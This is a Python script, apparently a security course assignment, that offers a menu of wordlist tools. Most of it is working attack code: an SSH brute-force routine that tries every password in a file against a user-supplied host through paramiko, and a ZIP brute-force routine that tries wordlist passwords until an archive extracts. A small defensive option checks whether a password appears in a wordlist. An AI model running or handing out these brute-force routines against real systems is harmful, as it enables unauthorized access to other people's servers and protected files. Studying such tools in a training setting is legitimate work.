#!/bin/usr/python3

# Script Name:                  ops401-challenge18
# Author:                       Omar Ardid
# Date of latest revision:      05/22/2024
# Purpose:                      Adding ZIP File Brute Force
# Resources:                    https://docs.python.org/3/library/zipfile.html#module-zipfile

import time
import paramiko, os, sys, socket
import zipfile

# Function to read passwords from a file
def read_passwords(password_file):
    # Open the file in read mode
    with open (password_file, "r") as file:
        # Read each line, strip trailing whitespace, and return as a list
        return [line.rstrip() for line in file]

# Function to check if a file path is valid    
def check_filepath(file_path, file_description):
    # Check if the given path is a valid file
    if not os.path.isfile(file_path):
        print(f"(ง •̀_•́)ง {file_description} not found. Please enter a valid file path!")
        # Return False if the is not found
        return False
    # Return True if the file path is valid
    return True

# Function for offensice password guessing from a word list    
def offensive():
    # Asking the user for word list
    wordlistpath = input("Enter word list file path: ") 
    # Checking the provided path is a file
    if check_filepath(wordlistpath, "Word file"):
        # Reading passwords from the file
        passwords = read_passwords(wordlistpath)
        # Iterating trough each password
        for word in passwords:
            # Print each password
            print(word)
            time.sleep(0.1) 

# Function for defensive password checking against a word list
def defensive():
    # Asking the user for target string
    target_password = input("Enter a password to search: ")
    # Asking the user for word list
    wordlistpath = input("Enter word list file path: ")
    # Checking the provided path is a file
    if check_filepath(wordlistpath, "Word file"):
        # Reading passwords from the file
        passwords = read_passwords(wordlistpath)
        # Checking if the target password is in the list 
        if target_password in passwords:
          # Print success message
          print(f"Password '{target_password}' found in the word list.")
        else:
            # Print failure message
            print(f"Password '{target_password}' not found in the word list.") 
    else:
        # Print error message if file is not valid
        print("(ง •̀_•́)ง Word file not found. Please enter a vaild file path! ")

# Function for performing SSH brute force attack
def ssh_brute_force():    
        # Prompt the user for target host address, SSH username, and password file path
        host = input("Enter Target Host Address: ")
        username = input("Enter SSH Username: ")
        input_file = input("Enter SSH Password File: ")

        # Checks if file path exists
        if not check_filepath(input_file, "Password file"):
            return   
        try:
            # Open password file in read mode
            with open(input_file, 'r') as file:
                # Iterate over each password in the file
                for password in file:
                    # Remove trailing whitespace from password
                    password = password.rstrip()
                    try:
                        # Create an SSH Client instance
                        ssh = paramiko.SSHClient()
                        # Set policy for automatically adding host keys
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        # Attempt SSH connection using the current password
                        ssh.connect(host, port=22, username=username, password=password, banner_timeout=30, auth_timeout=30)
                        # Close the SSH connection
                        ssh.close()
                        # Print success message if password is correct
                        print(f"٩(◕‿◕)۶ Success! Password found: {password}")
                        return
                    except paramiko.AuthenticationException:
                        # Print error message if authentication fails
                        print(f"(.づ◡ ﹏◡)づ. Failed! incorrect password: {password}")
                    except socket.error as e:
                        # Print error message if a socket error occurs
                        print(f"(`･︿´･ ) An error occurred: {e}")
        except KeyboardInterrupt:
            # Print message if user interrupts the process
            print("User Requested An Interrupt")
            # Exit the program
            sys.exit(3)

# Function for brute-forceing a ZIP file password
def zip_file():
    # Prompt the user for the path to zipped file and password list file
    zip_file = input("Enter the path to zipped file: ")
    password_file = input("Enter the path to password list: ")
    # Checks if both path are vaild files
    if not (check_filepath(zip_file, "ZIP file") and check_filepath(password_file, "Password file")):
        return
    # Read passwords from the file
    passwords = read_passwords(password_file)
    # Open the ZIP file
    with zipfile.ZipFile(zip_file) as zf:
        # Iterate over each password
        for password in passwords:
            try:
                # Try to extract the ZIP file using the current password
                zf.extractall(pwd=bytes(password,'utf-8'))
                # Print success message if password is correct
                print(f"٩(◕ ‿ ◕)۶ Success, Zipped File Brute Force extracted file with password: {password}")
                return
            except RuntimeError as e:
                # Check if the error is due to a bad password
                if "Bad password" in str(e):
                    # Print failure message for the current password
                    print(f"(ง •̀_•́)ง Failed password: {password}")
                else:
                    # Print other runtime errors
                    print(f"Error: {e}")
            except Exception as e:
                # Print any other exceptions that occur
                print(f"Error: {e}")
            time.sleep(0.1)

def menu():
    while True:
        print("\n~~~~~ Brute Force Wordlist Attack ~~~~~")
        print("1. Offensive; Dictionary Iterator")
        print("2. Defensive; Password Recognzied")
        print("3. SSH Brute Force")
        print("4. ZIP File Brute Force")
        print("0. Exit")
        choice = input("Enter a number: ")

        if choice == "1":
            offensive()
        elif choice == "2":
            defensive()
        elif choice == "3":
            ssh_brute_force()
        elif choice == "4":
            zip_file()
        elif choice == "0":
            print("(づ ◕‿◕ )づ Goodbye!")
            break
        else:
            print("\nง •̀_•́)ง Invalid number! ")

if __name__ == "__main__":
    menu()